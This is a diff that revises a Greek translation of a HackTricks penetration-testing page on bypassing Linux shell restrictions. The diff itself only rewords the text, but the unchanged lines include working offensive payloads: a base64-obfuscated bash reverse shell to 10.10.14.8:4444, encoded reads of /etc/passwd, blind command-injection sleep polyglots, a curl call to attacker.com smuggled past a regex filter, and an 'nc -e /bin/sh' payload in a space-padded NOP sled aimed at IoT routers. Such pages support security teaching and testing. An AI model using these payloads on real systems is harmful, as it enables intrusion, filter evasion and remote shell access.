@@ -1,8 +1,8 @@
-# Παράκαμψη Περιορισμών Linux
+# Παράκαμψη περιορισμών Linux
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Παρακάμψεις Συνηθισμένων Περιορισμών
+## Συνήθεις παρακάμψεις περιορισμών
 
 ### Reverse Shell
 ```bash
@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Παράκαμψη Paths και απαγορευμένων λέξεων
+### Bypass Paths και απαγορευμένες λέξεις
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Bypass με hex encoding
+### Παράκαμψη με hex encoding
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -140,12 +140,12 @@ echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-Μπορείτε να χρησιμοποιήσετε για παράδειγμα τα **burpcollab** ή [**pingb**](http://pingb.in).
+Μπορείτε να χρησιμοποιήσετε, για παράδειγμα, τα **burpcollab** ή [**pingb**](http://pingb.in).
 
 ### Builtins
 
-Σε περίπτωση που δεν μπορείτε να εκτελέσετε external functions και έχετε πρόσβαση μόνο σε ένα **περιορισμένο σύνολο builtins για την επίτευξη RCE**, υπάρχουν ορισμένα χρήσιμα tricks για να το κάνετε. Συνήθως **δεν θα μπορείτε να χρησιμοποιήσετε όλα** τα **builtins**, επομένως θα πρέπει να **γνωρίζετε όλες τις επιλογές σας** για να προσπαθήσετε να παρακάμψετε το jail. Ιδέα από τον [**devploit**](https://twitter.com/devploit).\
-Αρχικά ελέγξτε όλα τα [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Στη συνέχεια, ακολουθούν ορισμένες **συστάσεις**:
+Σε περίπτωση που δεν μπορείτε να εκτελέσετε εξωτερικές functions και έχετε πρόσβαση μόνο σε ένα **περιορισμένο σύνολο builtins για την επίτευξη RCE**, υπάρχουν ορισμένα χρήσιμα tricks για να το πετύχετε. Συνήθως **δεν θα μπορείτε να χρησιμοποιήσετε όλα** τα **builtins**, επομένως θα πρέπει να **γνωρίζετε όλες τις επιλογές σας** για να προσπαθήσετε να κάνετε bypass το jail. Ιδέα από τον [**devploit**](https://twitter.com/devploit).\
+Αρχικά ελέγξτε όλα τα [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Στη συνέχεια, παρακάτω θα βρείτε ορισμένες **συστάσεις**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Παράκαμψη πιθανών regex
+### Παράκαμψη πιθανών regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -296,8 +296,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-Αν βρίσκεστε μέσα σε ένα filesystem με τις **read-only και noexec protections** ή ακόμη και σε ένα distroless container, εξακολουθούν να υπάρχουν τρόποι να **εκτελέσετε arbitrary binaries, ακόμη και ένα shell!:**
-
+Αν βρίσκεστε μέσα σε ένα filesystem με **read-only και noexec protections** ή ακόμη και σε ένα distroless container, εξακολουθούν να υπάρχουν τρόποι να **εκτελέσετε arbitrary binaries, ακόμη και ένα shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -305,38 +304,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Chroot & other Jails Bypass
 
-
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Όταν ένα vulnerability σάς επιτρέπει να ελέγχετε εν μέρει ένα argument που τελικά καταλήγει στη `system()` ή σε άλλο shell, ενδέχεται να μην γνωρίζετε το ακριβές offset στο οποίο ξεκινά η εκτέλεση να διαβάζει το payload σας. Τα παραδοσιακά NOP sleds (π.χ. `\x90`) **δεν** λειτουργούν σε shell syntax, αλλά το Bash θα αγνοήσει harmlessly τα αρχικά whitespace πριν εκτελέσει μια command.
+Όταν ένα vulnerability σάς επιτρέπει να ελέγχετε μερικώς ένα argument που τελικά καταλήγει στη `system()` ή σε κάποιο άλλο shell, ενδέχεται να μην γνωρίζετε το ακριβές offset στο οποίο η εκτέλεση αρχίζει να διαβάζει το payload σας. Τα παραδοσιακά NOP sleds (π.χ. `\x90`) **δεν** λειτουργούν στη shell syntax, όμως το Bash αγνοεί harmlessly τα αρχικά κενά διαστήματα πριν εκτελέσει μια εντολή.
 
-Επομένως, μπορείτε να δημιουργήσετε ένα *NOP sled for Bash* προσθέτοντας πριν από την πραγματική σας command μια μεγάλη ακολουθία από spaces ή χαρακτήρες tab:
+Επομένως, μπορείτε να δημιουργήσετε ένα *NOP sled για Bash*, προσθέτοντας πριν από την πραγματική σας εντολή μια μεγάλη ακολουθία από κενά διαστήματα ή χαρακτήρες tab:<sup>[[5]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Αν ένα ROP chain (ή οποιοδήποτε memory-corruption primitive) καταλήξει με τον instruction pointer οπουδήποτε μέσα στο space block, ο Bash parser απλώς παρακάμπτει τα κενά μέχρι να φτάσει στο `nc`, εκτελώντας την εντολή σας αξιόπιστα.
+Αν μια αλυσίδα ROP (ή οποιοδήποτε primitive καταστροφής μνήμης) τοποθετήσει τον instruction pointer οπουδήποτε μέσα στο block κενών, ο Bash parser απλώς παρακάμπτει τα κενά μέχρι να φτάσει στο `nc`, εκτελώντας την εντολή σας αξιόπιστα.
 
 Πρακτικές περιπτώσεις χρήσης:
 
-1. **Memory-mapped configuration blobs** (π.χ. NVRAM) που είναι προσβάσιμα μεταξύ processes.
-2. Περιπτώσεις όπου ο attacker δεν μπορεί να γράψει NULL bytes για να ευθυγραμμίσει το payload.
-3. Embedded συσκευές όπου είναι διαθέσιμο μόνο το BusyBox `ash`/`sh` – επίσης αγνοούν τα αρχικά κενά.
+1. **Blobs ρυθμίσεων που έχουν γίνει memory-mapped** (π.χ. NVRAM) και είναι προσβάσιμα μεταξύ διεργασιών.
+2. Περιπτώσεις όπου ο attacker δεν μπορεί να γράψει bytes NULL για να ευθυγραμμίσει το payload.
+3. Embedded συσκευές όπου είναι διαθέσιμο μόνο το BusyBox `ash`/`sh` – και αυτά αγνοούν τα αρχικά κενά.
 
 > 🛠️  Συνδυάστε αυτό το trick με ROP gadgets που καλούν τη `system()`, για να αυξήσετε δραματικά την αξιοπιστία του exploit σε IoT routers με περιορισμένη μνήμη.
 
-## References & Περισσότερα
+## Αναφορές
 
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
-
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
+- [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [3] [Τεχνικές παράκαμψης Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Τεχνικές παράκαμψης Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Εκμετάλλευση zero days σε εγκαταλελειμμένο hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../../banners/hacktricks-training.md}}
